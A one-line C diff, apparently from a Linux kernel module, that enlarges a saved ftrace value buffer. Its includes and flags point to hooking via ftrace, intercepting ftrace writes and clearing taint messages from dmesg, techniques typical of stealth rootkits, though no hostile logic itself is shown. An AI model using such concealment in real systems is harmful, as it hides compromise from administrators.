@@ -2,7 +2,7 @@
 #include "../ftrace/ftrace_helper.h"
 #include "../include/clear_taint_dmesg.h"
 
-extern char saved_ftrace_value[16];
+extern char saved_ftrace_value[64];
 extern bool ftrace_write_intercepted;
 
 #define MAX_CAP (64*1024)
